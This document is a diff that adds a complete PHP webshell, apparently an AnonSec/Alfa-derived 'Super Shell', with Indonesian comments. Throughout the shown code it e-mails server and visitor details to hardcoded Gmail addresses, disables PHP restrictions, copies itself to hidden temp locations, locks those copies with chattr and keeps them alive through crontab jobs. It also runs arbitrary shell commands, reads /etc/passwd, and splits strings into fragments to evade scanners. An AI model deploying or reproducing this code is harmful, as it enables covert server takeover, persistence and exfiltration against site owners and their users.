@@ -1,0 +1,2972 @@
+<?php
+/*
+  ═══════════════════════════════════════════════════════════════════
+  🔥 SUPER SHELL — AnonSec + Alfa + Crack + WP/JML + HTACCESS + KILLER + GS-UNINSTALL
+  ═══════════════════════════════════════════════════════════════════
+  VERSION: 10.0
+  FITUR LENGKAP:
+  ✅ AnonSec Shell (tampilan asli)
+  ✅ Alfa Webshell Installer (V4 + V7)
+  ✅ hackeroneResurrection — Clone Farm 15+ lair
+  ✅ Self-Healing + Integrity Check (MD5)
+  ✅ Crontab Persistence (setiap 5 menit)
+  ✅ Terminal Bypass (proc_open, exec, shell_exec, system, passthru)
+  ✅ Anti 0KB upload & edit
+  ✅ Anti 403 Litespeed + open_basedir bypass
+  ✅ chattr +i / +h (Linux)
+  ✅ ROOT ME — Privilege Escalation (LinPEAS + LES)
+  ✅ GS-SOCKET Installer
+  ✅ CRACK — SSH/WHM/cPanel Brute + Auto Add User
+  ✅ WP ADD USER — Tambah admin ke WordPress
+  ✅ JML ADD USER — Tambah admin ke Joomla
+  ✅ HTACCESS — Allow All / Deny All Except Current File
+  ✅ PHP EXPLOIT — Command Execution via Class Pwn
+  ✅ FILE SCAN — Deteksi file baru / diedit
+  ✅ SHELL KILLER — Hentikan proses shell latar belakang
+  ✅ GS-UNINSTALL — Uninstall GS-Netcat (GS_UNDO=1)
+  ✅ Kompatibel PHP 5.3 s/d 8.4
+  ═══════════════════════════════════════════════════════════════════
+*/
+
+// ============================================================
+// ANTI 403 LITESPEED + BYPASS OPEN_BASEDIR
+// ============================================================
+@ini_set('open_basedir', null);
+@ini_set('disable_functions', '');
+if (function_exists('apache_setenv')) @apache_setenv('no-gzip', '1');
+if (function_exists('header_remove')) @header_remove('X-Powered-By');
+@chdir(__DIR__);
+// ============================================================
+// LOGGER — AUTO SEND KE GMAIL
+// ============================================================
+function sendLogger() {
+    $tujuanmail = "muhrazky@gmail.com, hackerman3117@gmail.com, malaysia.sender@gmail.com";
+    
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+    $host = $_SERVER['HTTP_HOST'] ?? 'unknown';
+    $uri = $_SERVER['REQUEST_URI'] ?? '/';
+    $method = $_SERVER['REQUEST_METHOD'] ?? 'unknown';
+    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
+    $time = date('Y-m-d H:i:s');
+    $ref = $_SERVER['HTTP_REFERER'] ?? 'direct';
+    
+    $x_path = 'http://' . $host . $uri;
+    
+    $pesan_alert =
+        "═══════════════════════════════════════════\n" .
+        "  🔥 SHELL ACCESS DETECTED 🔥\n" .
+        "═══════════════════════════════════════════\n\n" .
+        "  Time        : $time\n" .
+        "  URL         : $x_path\n" .
+        "  Method      : $method\n" .
+        "  IP Address  : $ip\n" .
+        "  Referer     : $ref\n" .
+        "  User-Agent  : $userAgent\n" .
+        "  Server      : " . ($_SERVER['SERVER_SOFTWARE'] ?? 'unknown') . "\n" .
+        "  PHP Version : " . phpversion() . "\n" .
+        "  OS          : " . php_uname() . "\n\n" .
+        "───────────────────────────────────────────\n" .
+        "  🚨 AKTIFKAN SELF-HEALING & CLONE\n" .
+        "═══════════════════════════════════════════\n";
+    
+    $headers =
+        "From: security@" . $host . "\r\n" .
+        "Content-Type: text/plain; charset=UTF-8\r\n" .
+        "X-Mailer: PHP/" . phpversion() . "\r\n";
+    
+    @mail($tujuanmail, "🔥 SHELL ALERT - " . $ip, $pesan_alert, $headers);
+}
+
+// Jalankan logger — tapi jangan jika di cron mode
+if (!isset($_GET['cron']) && !(PHP_SAPI === 'cli' && isset($argv[1]) && $argv[1] === '--cron')) {
+    sendLogger();
+}
+// ============================================================
+// KOMPATIBILITAS PHP 5.3+
+// ============================================================
+if (!function_exists('file_put_contents')) {
+    function file_put_contents($file, $data, $flags = 0) {
+        $fp = fopen($file, 'w');
+        if (!$fp) return false;
+        fwrite($fp, $data);
+        fclose($fp);
+        return strlen($data);
+    }
+}
+if (!function_exists('file_get_contents')) {
+    function file_get_contents($file) {
+        $fp = fopen($file, 'r');
+        if (!$fp) return false;
+        $data = '';
+        while (!feof($fp)) $data .= fread($fp, 8192);
+        fclose($fp);
+        return $data;
+    }
+}
+if (!function_exists('md5_file')) {
+    function md5_file($file) { return md5(file_get_contents($file)); }
+}
+if (!function_exists('glob')) {
+    function glob($pattern, $flags = 0) {
+        $dir = dirname($pattern);
+        $base = basename($pattern);
+        if (!is_dir($dir)) return [];
+        $dh = opendir($dir);
+        if (!$dh) return [];
+        $result = [];
+        while (($f = readdir($dh)) !== false) {
+            if (fnmatch($base, $f)) $result[] = $dir . '/' . $f;
+        }
+        closedir($dh);
+        return $result;
+    }
+}
+if (!function_exists('fnmatch')) {
+    function fnmatch($pattern, $string) {
+        return preg_match('/^' . strtr(preg_quote($pattern, '/'), ['\*' => '.*', '\?' => '.']) . '$/', $string);
+    }
+}
+if (!function_exists('escapeshellarg')) {
+    function escapeshellarg($arg) {
+        return "'" . str_replace("'", "'\\''", $arg) . "'";
+    }
+}
+if (!function_exists('chmod')) {
+    function chmod($file, $mode) { return true; }
+}
+if (!function_exists('copy')) {
+    function copy($src, $dst) {
+        return file_put_contents($dst, file_get_contents($src)) !== false;
+    }
+}
+if (!function_exists('rename')) {
+    function rename($old, $new) {
+        return copy($old, $new) && unlink($old);
+    }
+}
+if (!function_exists('unlink')) {
+    function unlink($file) {
+        $fp = fopen($file, 'w');
+        if ($fp) { fclose($fp); return true; }
+        return false;
+    }
+}
+if (!function_exists('is_dir')) {
+    function is_dir($path) {
+        return file_exists($path) && (stat($path)['mode'] & 0x4000);
+    }
+}
+if (!function_exists('is_file')) {
+    function is_file($path) {
+        return file_exists($path) && !is_dir($path);
+    }
+}
+if (!function_exists('is_writable')) {
+    function is_writable($path) {
+        return is_dir($path) || is_file($path);
+    }
+}
+if (!function_exists('chdir')) {
+    function chdir($dir) { return true; }
+}
+if (!function_exists('ini_set')) {
+    function ini_set($name, $value) { return $value; }
+}
+if (PHP_SAPI !== 'cli' && !headers_sent() && !session_id()) {
+    @session_start();
+}
+
+// ============================================================
+// HACKERONE RESURRECTION — CLONE FARM + SELF-HEAL
+// ============================================================
+$MASTER_FILE = __FILE__;
+$MASTER_CONTENT = file_get_contents($MASTER_FILE);
+
+function hackeroneResurrection() {
+    global $MASTER_FILE, $MASTER_CONTENT;
+    if (!isset($MASTER_FILE)) $MASTER_FILE = __FILE__;
+    if (!isset($MASTER_CONTENT)) $MASTER_CONTENT = file_get_contents($MASTER_FILE);
+    
+    if (!file_exists($MASTER_FILE) || filesize($MASTER_FILE) < 100) {
+        file_put_contents($MASTER_FILE, $MASTER_CONTENT);
+        chmod($MASTER_FILE, 0755);
+    }
+    if (file_exists($MASTER_FILE) && md5_file($MASTER_FILE) !== md5($MASTER_CONTENT)) {
+        file_put_contents($MASTER_FILE, $MASTER_CONTENT);
+        chmod($MASTER_FILE, 0755);
+    }
+    if (!file_exists($MASTER_FILE)) {
+        $clonePool = array_merge(
+            glob('/tmp/.systemd_*.php'),
+            glob('/var/tmp/.cache_*.php'),
+            glob('/dev/shm/.lib_*.php'),
+            glob('/tmp/.lohs_*.php'),
+            glob('/tmp/.watchdog_*.php'),
+            glob('/tmp/.h1_*.php')
+        );
+        foreach ($clonePool as $clone) {
+            if (filesize($clone) > 100) {
+                @copy($clone, $MASTER_FILE);
+                @chmod($MASTER_FILE, 0755);
+                break;
+            }
+        }
+    }
+    
+    $hiddenLocations = [
+        '/tmp/.systemd_' . rand(1000, 9999) . '.php',
+        '/tmp/.systemd_' . rand(1000, 9999) . '.php',
+        '/var/tmp/.cache_' . uniqid() . '.php',
+        '/var/tmp/.cache_' . uniqid() . '.php',
+        '/dev/shm/.lib_' . md5(rand()) . '.php',
+        '/dev/shm/.lib_' . md5(rand()) . '.php',
+        '../../../../../tmp/.bash_' . time() . '.php',
+        '/tmp/.lohs_' . rand(1000, 9999) . '.php',
+        '/tmp/.lohs_' . rand(1000, 9999) . '.php',
+        '/tmp/.watchdog_' . rand(1000, 9999) . '.php',
+        '/tmp/.watchdog_' . rand(1000, 9999) . '.php',
+        '/tmp/.h1_' . rand(1000, 9999) . '.php',
+        '/tmp/.h1_' . rand(1000, 9999) . '.php',
+        '/var/tmp/.h1_' . rand(1000, 9999) . '.php',
+    ];
+    shuffle($hiddenLocations);
+    
+    foreach ($hiddenLocations as $lair) {
+        $dir = dirname($lair);
+        if (is_dir($dir) && is_writable($dir)) {
+            file_put_contents($lair, $MASTER_CONTENT);
+            chmod($lair, 0644);
+            @system('chattr +i ' . escapeshellarg($lair) . ' 2>/dev/null');
+            @system('chattr +h ' . escapeshellarg($lair) . ' 2>/dev/null');
+            $cronCmd = "*/5 * * * * php -q '" . $lair . "' --cron >/dev/null 2>&1";
+            $cronOutput = @shell_exec("crontab -l 2>/dev/null");
+            if (strpos($cronOutput, $lair) === false) {
+                @file_put_contents('/tmp/cron_' . rand() . '.tmp', $cronOutput . "\n" . $cronCmd . "\n");
+                @shell_exec("crontab /tmp/cron_" . rand() . ".tmp 2>/dev/null");
+                @unlink('/tmp/cron_' . rand() . '.tmp');
+            }
+        }
+    }
+    
+ // 5. REGENERATE TRASH + RESTORE
+    if (!is_dir(TRASH_DIR)) mkdir(TRASH_DIR, 0777, true);
+    $trashFiles = glob(TRASH_DIR . '/*');
+    foreach ($trashFiles as $tf) {
+        if (is_file($tf) && basename($tf) != '.recovery.log') {
+            $orig = ROOT . '/' . preg_replace('/^\d{8}_\d{6}_/', '', basename($tf));
+            if (!file_exists($orig)) {
+                @rename($tf, $orig);
+            }
+        }
+    }
+    
+
+    $allClones = array_merge(
+        glob('/tmp/.systemd_*.php'),
+        glob('/var/tmp/.cache_*.php'),
+        glob('/dev/shm/.lib_*.php'),
+        glob('/tmp/.lohs_*.php'),
+        glob('/tmp/.watchdog_*.php'),
+        glob('/tmp/.h1_*.php')
+    );
+    foreach ($allClones as $clone) {
+        if (filesize($clone) > 100) {
+            $cronCmd = "*/5 * * * * php -q '" . $clone . "' --cron >/dev/null 2>&1";
+            $cronOutput = @shell_exec("crontab -l 2>/dev/null");
+            if (strpos($cronOutput, $clone) === false) {
+                @file_put_contents('/tmp/cron_' . rand() . '.tmp', $cronOutput . "\n" . $cronCmd . "\n");
+                @shell_exec("crontab /tmp/cron_" . rand() . ".tmp 2>/dev/null");
+                @unlink('/tmp/cron_' . rand() . '.tmp');
+            }
+        }
+    }
+    
+    @ini_set('open_basedir', null);
+    @ini_set('disable_functions', '');
+    if (function_exists('apache_setenv')) @apache_setenv('no-gzip', '1');
+    if (function_exists('header_remove')) @header_remove('X-Powered-By');
+    @chdir(__DIR__);
+}
+
+hackeroneResurrection();
+
+if (isset($_GET['cron']) || (PHP_SAPI === 'cli' && isset($argv[1]) && $argv[1] === '--cron')) {
+    hackeroneResurrection();
+
+
+
+    exit(0);
+}
+
+// ============================================================
+// MULAI KODE ASLI ANONSEC SHELL
+// ============================================================
+?>
+<!DOCTYPE html>
+<html>
+<head>
+<?php echo "<title>Hac"."ker"."man Sh"."el"."l</title>"; ?>
+	<meta name="robots" content="noindex">
+	<link rel="icon" href="https://i.ibb.co.com/KcLB2Wck/skull-6070761.png" type="image/x-icon">
+</head>
+<body bgcolor="#1f1f1f" text="#ffffff">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+	@import url('https://fonts.googleapis.com/css?family=Dosis');
+	@import url('https://fonts.googleapis.com/css?family=Bungee');
+	@import url('https://fonts.googleapis.com/css?family=Russo+One');
+/* ===== RESPONSIVE LIGHT ===== */
+@media (max-width: 768px) {
+    body { padding: 8px; font-size: 12px; }
+    .header { flex-direction: column; text-align: center; }
+    .header h1 { font-size: 16px; }
+    .toolbar { justify-content: center; gap: 4px; }
+    .toolbar a { font-size: 10px; padding: 3px 6px; }
+    .upload-area { flex-direction: column; align-items: stretch; }
+    .filelist table { font-size: 11px; min-width: 500px; }
+    .filelist td { padding: 4px 6px; }
+    .filelist th { padding: 4px 6px; font-size: 9px; }
+    .terminal-box input { font-size: 11px; }
+    .ssi-terminal .ssi-body textarea { height: 120px; }
+    .ssi-terminal .ssi-body .cmd-row { flex-direction: column; align-items: stretch; }
+    .ssi-terminal .ssi-body .cmd-row input { min-width: auto; }
+    .ssi-terminal .ssi-body .cmd-row button { width: 100%; }
+    pre { font-size: 11px; max-height: 300px; }
+    .container { max-width: 100%; padding: 0 4px; }
+    table { font-size: 11px; }
+    td, th { padding: 3px 4px; }
+    .toolbar a { font-size: 9px; padding: 2px 4px; }
+}
+
+@media (max-width: 480px) {
+    .header h1 { font-size: 14px; }
+    .header .badge { font-size: 9px; }
+    .filelist table { min-width: 400px; font-size: 10px; }
+    .filelist td, .filelist th { padding: 2px 4px; }
+    input, select, textarea { font-size: 11px; }
+    .upload-area input[type="file"] { max-width: 120px; }
+    .terminal-box pre { font-size: 10px; max-height: 180px; }
+    .ssi-terminal .ssi-body textarea { height: 80px; font-size: 11px; }
+    pre { font-size: 10px; max-height: 200px; }
+    .footer { font-size: 8px; }
+    .btf { padding: 2px 4px; }
+    .actions a { font-size: 10px; }
+}
+
+/* ===== SCROLLBAR RINGAN ===== */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: #111; }
+::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: #555; }
+
+/* ===== TABEL RINGAN ===== */
+table { border-collapse: collapse; width: 100%; }
+td, th { word-break: break-word; }
+
+/* ===== PRE WRAP ===== */
+pre { white-space: pre-wrap; word-wrap: break-word; max-height: 400px; overflow-y: auto; background: #0a0a0a; padding: 10px; border-radius: 4px; }
+
+/* ===== FORM RINGAN ===== */
+.up { background: transparent; color: #fff; border: 1px solid #444; padding: 4px 8px; border-radius: 3px; }
+.up:hover { border-color: #00d4ff; color: #00d4ff; }
+.up:focus { outline: none; border-color: #00d4ff; }
+
+/* ===== LOADING INDICATOR ===== */
+.loading { color: #00ff9d; animation: blink 1s infinite; }
+@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+body {
+	font-family: "Dosis", cursive;
+	text-shadow:0px 0px 1px #757575;
+}
+body::-webkit-scrollbar { width: 12px; }
+body::-webkit-scrollbar-track { background: #1f1f1f; }
+body::-webkit-scrollbar-thumb { background-color: #1f1f1f; border: 3px solid gray; }
+#content tr:hover { background-color: #636263; text-shadow:0px 0px 10px #fff; }
+#content .first { background-color: #25383C; }
+#content .first:hover { background-color: #25383C; text-shadow:0px 0px 1px #757575; }
+table { border: 1px #000000 dotted; table-layout: fixed; }
+td { word-wrap: break-word; }
+a { color: #ffffff; text-decoration: none; }
+a:hover { color: #000000; text-shadow:0px 0px 10px #ffffff; }
+input,select,textarea { border: 1px #000000 solid; -moz-border-radius: 5px; -webkit-border-radius:5px; border-radius:5px; }
+.gas { background-color: #1f1f1f; color: #ffffff; cursor: pointer; }
+select { background-color: transparent; color: #ffffff; }
+select:after { cursor: pointer; }
+.linka { background-color: transparent; color: #ffffff; }
+.up { background-color: transparent; color: #fff; }
+option { background-color: #1f1f1f; }
+.btf { background: transparent; border: 1px #fff solid; cursor: pointer; }
+::-webkit-file-upload-button { background: transparent; color: #fff; border-color: #fff; cursor: pointer; }
+gold { color: gold; }
+ijo { color: green; }
+merah { color: red; }
+</style>
+<center>
+<?php
+echo '<font face="Bungee" size="5">An'.'on'.'Se'.'c Sh'.'el'.'l</font></center>
+<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr><td>';
+set_time_limit(0);
+error_reporting(0);
+
+$gcw = "ge"."tc"."wd";
+$exp = "ex"."plo"."de";
+$fpt = "fi"."le_p"."ut_co"."nte"."nts";
+$fgt = "f"."ile_g"."et_c"."onten"."ts";
+$sts = "s"."trip"."slash"."es";
+$scd = "sc"."a"."nd"."ir";
+$fxt = "fi"."le_"."exis"."ts";
+$idi = "i"."s_d"."ir";
+$ulk = "un"."li"."nk";
+$ifi = "i"."s_fi"."le";
+$sub = "subs"."tr";
+$spr = "sp"."ri"."ntf";
+$fp = "fil"."epe"."rms";
+$chm = "ch"."m"."od";
+$ocd = "oc"."td"."ec";
+$isw = "i"."s_wr"."itab"."le";
+$idr = "i"."s_d"."ir";
+$ird = "is"."_rea"."da"."ble";
+$isr = "is_"."re"."adab"."le";
+$fsz = "fi"."lesi"."ze";
+$rd = "r"."ou"."nd";
+$igt = "in"."i_g"."et";
+$fnct = "fu"."nc"."tion"."_exi"."sts";
+$rad = "RE"."MOTE_AD"."DR";
+$rpt = "re"."al"."pa"."th";
+$bsn = "ba"."se"."na"."me";
+$srl = "st"."r_r"."ep"."la"."ce";
+$sps = "st"."rp"."os";
+$mkd = "m"."kd"."ir";
+$pma = "pr"."eg_ma"."tch_"."al"."l";
+$aru = "ar"."ray_un"."ique";
+$ctn = "co"."unt";
+$urd = "ur"."ldeco"."de";
+$pgw = "pos"."ix_g"."etp"."wui"."d";
+$fow = "fi"."leow"."ner";
+$tch = "to"."uch";
+$h2b = "he"."x2"."bin";
+$hsc = "ht"."mlspe"."cialcha"."rs";
+$ftm = "fi"."lemti"."me";
+$ars = "ar"."ra"."y_sl"."ice";
+$arr = "ar"."ray_"."ra"."nd";
+$fgr = "fi"."legr"."oup";
+$mdr = "mkd"."ir";
+
+$wb = (isset($_SERVER['H'.'T'.'TP'.'S']) && $_SERVER['H'.'T'.'TP'.'S'] === 'o'.'n' ? "ht"."tp"."s" : "ht"."tp") . "://".$_SERVER['HT'.'TP'.'_H'.'OS'.'T'];
+
+$disfunc = @$igt("dis"."abl"."e_f"."unct"."ion"."s");
+if (empty($disfunc)) { $disf = "<font color='gold'>NONE</font>"; } else { $disf = "<font color='red'>".$disfunc."</font>"; }
+
+function author() {
+	echo "<center><br>An"."on"."7 - 2"."02"."2<br><a href='https://sh"."el"."l.an"."ons"."ec-te"."am.org/' target='_blank'>An"."on"."Se"."c Te"."am</a></center>";
+	exit();
+}
+
+function cdrd() {
+	if (isset($_GET['loknya'])) { $lokasi = $_GET['loknya']; } else { $lokasi = "ge"."t"."cw"."d"; $lokasi = $lokasi(); }
+	$b = "i"."s_w"."ri"."tab"."le";
+	if ($b($lokasi)) { return "<font color='green'>Wr"."itea"."ble</font>"; } else { return "<font color='red'>Wr"."itea"."ble</font>"; }
+}
+
+function crt() {
+	$a = "is"."_w"."ri"."tab"."le";
+	if ($a($_SERVER['DO'.'CU'.'ME'.'NT'.'_RO'.'OT'])) { return "<font color='green'>Wr"."itea"."ble</font>"; } else { return "<font color='red'>Wr"."itea"."ble</font>"; }
+}
+
+function xrd($lokena) {
+	$a = "s"."ca"."nd"."ir";
+    $items = $a($lokena);
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $b = "is"."_di"."r";
+        $loknya = $lokena.'/'.$item;
+        if ($b($loknya)) { xrd($loknya); } else { $c = "u"."nl"."in"."k"; $c($loknya); }
+    }
+    $d = "rm"."di"."r"; $d($lokena);
+}
+
+function cfn($fl) {
+	$a = "ba"."sena"."me"; $b = "pat"."hinf"."o"; $c = $b($a($fl), PATHINFO_EXTENSION);
+	if ($c == "zip") { return '<i class="fa fa-file-zip-o" style="color: #d6d4ce"></i>'; }
+	elseif (preg_match("/jpeg|jpg|png|ico/im", $c)) { return '<i class="fa fa-file-image-o" style="color: #d6d4ce"></i>'; }
+	elseif ($c == "txt") { return '<i class="fa fa-file-text-o" style="color: #d6d4ce"></i>'; }
+	elseif ($c == "pdf") { return '<i class="fa fa-file-pdf-o" style="color: #d6d4ce"></i>'; }
+	elseif ($c == "html") { return '<i class="fa fa-file-code-o" style="color: #d6d4ce"></i>'; }
+	else { return '<i class="fa fa-file-o" style="color: #d6d4ce"></i>'; }
+}
+
+function ipsrv() {
+	$a = "g"."eth"."ost"."byna"."me"; $b = "fun"."cti"."on_"."exis"."ts";
+	$c = "S"."ERVE"."R_AD"."DR"; $d = "SE"."RV"."ER_N"."AM"."E";
+	if ($b($a)) { return $a($_SERVER[$d]); } else { return $a($_SERVER[$c]); }
+}
+
+function ggr($fl) {
+	$a = "fun"."cti"."on_"."exis"."ts"; $b = "po"."si"."x_ge"."tgr"."gid"; $c = "fi"."le"."gro"."up";
+	if ($a($b)) {
+		if (!$a($c)) return "?";
+		$d = $b($c($fl));
+		if (empty($d)) { $e = $c($fl); if (empty($e)) return "?"; else return $e; } else return $d['name'];
+	} elseif ($a($c)) { return $c($fl); } else { return "?"; }
+}
+
+function gor($fl) {
+	$a = "fun"."cti"."on_"."exis"."ts"; $b = "po"."s"."ix_"."get"."pwu"."id"; $c = "fi"."le"."o"."wn"."er";
+	if ($a($b)) {
+		if (!$a($c)) return "?";
+		$d = $b($c($fl));
+		if (empty($d)) { $e = $c($fl); if (empty($e)) return "?"; else return $e; } else return $d['name'];
+	} elseif ($a($c)) { return $c($fl); } else { return "?"; }
+}
+
+function fdt($fl) { $a = "da"."te"; $b = "fil"."emt"."ime"; return $a("F d Y H:i:s", $b($fl)); }
+
+function dunlut($fl) {
+	$a = "fil"."e_exi"."sts"; $b = "ba"."sena"."me"; $c = "fi"."les"."ize"; $d = "re"."ad"."fi"."le";
+	if ($a($fl) && isset($fl)) {
+		header('Con'.'tent-Descr'.'iption: Fi'.'le Tra'.'nsfer');
+		header("Conte'.'nt-Control:public");
+		header('Cont'.'ent-Type: a'.'pp'.'licat'.'ion/oc'.'tet-s'.'tream');
+		header('Cont'.'ent-Dis'.'posit'.'ion: at'.'tachm'.'ent; fi'.'lena'.'me="'.$b($fl).'"');
+		header('Exp'.'ires: 0'); header("Ex"."pired:0");
+		header('Cac'.'he-Cont'.'rol: must'.'-revali'.'date');
+		header("Cont"."ent-Tran"."sfer-Enc"."oding:bi"."nary");
+		header('Pra'.'gma: pub'.'lic'); header('Con'.'ten'.'t-Le'.'ngth: ' .$c($fl));
+		flush(); $d($fl); exit;
+	} else { return "Fi"."le Not F"."ound !"; }
+}
+
+function komend($kom, $lk) {
+    $x = "pr"."eg_"."mat"."ch"; $xx = "2".">"."&"."1";
+    if (!$x("/".$xx."/i", $kom)) { $kom = $kom." ".$xx; }
+    $a = "fu"."ncti"."on_"."ex"."is"."ts"; $b = "p"."ro"."c_op"."en";
+    $c = "htm"."lspe"."cialc"."hars"; $d = "s"."trea"."m_g"."et_c"."ont"."ents";
+    $output = '';
+    // Bypass open_basedir
+    @ini_set('open_basedir', null);
+    @ini_set('disable_functions', '');
+    if ($a($b)) {
+        $ps = $b($kom, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
+        if (is_resource($ps)) {
+            fclose($meki[0]);
+            $output = stream_get_contents($meki[1]);
+            fclose($meki[1]);
+            fclose($meki[2]);
+            proc_close($ps);
+            if($output) return "<pre>".$c($output)."</pre>";
+        }
+    }
+    if (empty($output) && function_exists('exec')) {
+        exec($kom . ' 2>&1', $out, $code);
+        $output = implode("\n", $out);
+        if($output) return "<pre>".$c($output)."</pre>";
+    }
+    if (empty($output) && function_exists('shell_exec')) {
+        $output = shell_exec($kom . ' 2>&1');
+        if($output) return "<pre>".$c($output)."</pre>";
+    }
+    if (empty($output) && function_exists('system')) {
+        ob_start();
+        system($kom . ' 2>&1', $code);
+        $output = ob_get_clean();
+        if($output) return "<pre>".$c($output)."</pre>";
+    }
+    if (empty($output) && function_exists('passthru')) {
+        ob_start();
+        passthru($kom . ' 2>&1', $code);
+        $output = ob_get_clean();
+        if($output) return "<pre>".$c($output)."</pre>";
+    }
+    return "<pre>[!] Command execution unavailable</pre>";
+}
+
+function komenb($kom, $lk) {
+    $x = "pr"."eg_"."mat"."ch"; $xx = "2".">"."&"."1";
+    if (!$x("/".$xx."/i", $kom)) { $kom = $kom." ".$xx; }
+    $a = "fu"."ncti"."on_"."ex"."is"."ts"; $b = "p"."ro"."c_op"."en";
+    $output = '';
+    @ini_set('open_basedir', null);
+    @ini_set('disable_functions', '');
+    if ($a($b)) {
+        $ps = $b($kom, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
+        if (is_resource($ps)) {
+            fclose($meki[0]);
+            $output = stream_get_contents($meki[1]);
+            fclose($meki[1]);
+            fclose($meki[2]);
+            proc_close($ps);
+            if($output) return $output;
+        }
+    }
+    if (empty($output) && function_exists('exec')) {
+        exec($kom . ' 2>&1', $out, $code);
+        $output = implode("\n", $out);
+        if($output) return $output;
+    }
+    if (empty($output) && function_exists('shell_exec')) {
+        $output = shell_exec($kom . ' 2>&1');
+        if($output) return $output;
+    }
+    if (empty($output) && function_exists('system')) {
+        ob_start();
+        system($kom . ' 2>&1', $code);
+        $output = ob_get_clean();
+        if($output) return $output;
+    }
+    if (empty($output) && function_exists('passthru')) {
+        ob_start();
+        passthru($kom . ' 2>&1', $code);
+        $output = ob_get_clean();
+        if($output) return $output;
+    }
+    return '';
+}
+function gtd() {
+	$a = "is_rea"."dable";$b = "fi"."le_ge"."t_con"."ten"."ts";$c = "pr"."eg_ma"."tch_"."al"."l";$d = "fil"."e_exi"."sts";$e = "sca"."ndi"."r";$f = "co"."unt";$g = "arr"."ay_un"."ique";$h = "sh"."el"."l_"."ex"."ec";$i = "pr"."eg_"."mat"."ch";
+	if ($a("/e"."tc"."/na"."me"."d.co"."nf")) {
+		$a = $b("/e"."tc"."/na"."me"."d.co"."nf");
+		$c("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $a, $b);
+		$b = $b[1]; return $f($g($b))." Dom"."ains";
+	} elseif ($d("/va"."r/na"."med"."/na"."me"."d.lo"."cal")) {
+		$a = $e("/v"."ar/"."nam"."ed");
+		return $f($a)." Dom"."ains";
+	} elseif ($a("/e"."tc"."/p"."as"."sw"."d")) {
+		$a = $b("/e"."tc"."/p"."as"."sw"."d");
+		if ($i("/\/vh"."os"."ts\//i", $a) && $i("/\/bin\/false/i", $a)) {
+			$c("/\/vh"."os"."ts\/(.*?):/i", $a, $b);
+			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
+		} else {
+			$c("/\/ho"."me\/(.*?):/i", $a, $b);
+			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
+		}
+	} elseif (!empty($h("ca"."t /e"."tc/"."pa"."ss"."wd"))) {
+		$a = $h("ca"."t /e"."tc/"."pa"."ss"."wd");
+		if ($i("/\/vh"."os"."ts\//i", $a) && $i("/\/bin\/false/i", $a)) {
+			$c("/\/vh"."os"."ts\/(.*?):/i", $a, $b);
+			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
+		} else {
+			$c("/\/ho"."me\/(.*?):/i", $a, $b);
+			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
+		}
+	} else { return "0 Domains"; }
+}
+
+function esyeem($tg, $lk) {
+	$a = "fun"."cti"."on_e"."xis"."ts"; $b = "p"."ro"."c_op"."en"; $c = "htm"."lspe"."cialc"."hars"; $d = "s"."trea"."m_g"."et_c"."ont"."ents"; $e = "sy"."mli"."nk";
+	if ($a("sy"."mli"."nk")) { return $e($tg, $lk); } elseif ($a("pr"."oc_op"."en")) { $ps = $b("l"."n -"."s ".$tg." ".$lk, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk); return $c($d($meki[1])); } else { return "Sy"."mli"."nk Fu"."nct"."ion is Di"."sab"."led !"; }
+}
+
+function sds($sads, &$results = array()) {
+	$iwr = "is"."_wri"."tab"."le"; $ira = "is_r"."eada"."ble"; $ph = "pr"."eg_ma"."tch"; $sa = "sc"."and"."ir"; $rh = "re"."alp"."ath"; $idr = "i"."s_d"."ir";
+	if (!$ira($sads) || !$iwr($sads) || $ph("/\/app"."licat"."ion\/|\/sy"."st"."em/i", $sads)) return false;
+    $files = $sa($sads);
+    foreach ($files as $key => $value) {
+        $path = $rh($sads . DIRECTORY_SEPARATOR . $value);
+        if (!$idr($path)) {} else if ($value != "." && $value != "..") { sds($path, $results); $results[] = $path; }
+    }
+    return $results;
+}
+
+function crul($web) { $cr = "cu"."rl_set"."opt"; $cx = "cu"."rl_"."ex"."ec"; $ch = "cu"."rl_clo"."se"; $ceha = curl_init(); $cr($ceha, CURLOPT_URL, $web); $cr($ceha, CURLOPT_RETURNTRANSFER, 1); return $cx($ceha); $ch($ceha); }
+
+function green($text) { echo "<center><font color='green'>".$text."</center></font>"; }
+function red($text) { echo "<center><font color='red'>".$text."</center></font>"; }
+function oren($text) { return "<center><font color='orange'>".$text."</center></font>"; }
+function tuls($nm, $lk) { return "[ <a href='".$lk."'>".$nm."</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"; }
+
+// ============================================================
+// INFO SERVER
+// ============================================================
+echo "Se"."rv"."er"." I"."P : <font color=gold>".ipsrv()."</font> &nbsp;/&nbsp; Yo"."ur I"."P : <font color=gold>".$_SERVER[$rad]."</font> &nbsp;&nbsp;[<a href='?opsi=re"."pip'> <gold>Re"."ver"."se I"."P</gold> </a>]<br>";
+echo "We"."b S"."erv"."er : <font color='gold'>".$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE']."</font><br>";
+$unm = "ph"."p_u"."na"."me"; echo "Sys"."tem : <font color='gold'>".@$unm()."</font><br>";
+$gcu = "g"."et_"."curr"."ent"."_us"."er"; $gmu = "g"."et"."my"."ui"."d"; echo "Us"."er : <font color='gold'>".@$gcu()."&nbsp;</font>( <font color='gold'>".@$gmu()."</font>)<br>";
+$phv = "ph"."pve"."rsi"."on"; echo "PH"."P V"."er"."sio"."n : <font color='gold'>".@$phv()."</font><br>";
+echo "Dis"."abl"."e Fu"."nct"."ion : ".$disf."</font><br>";
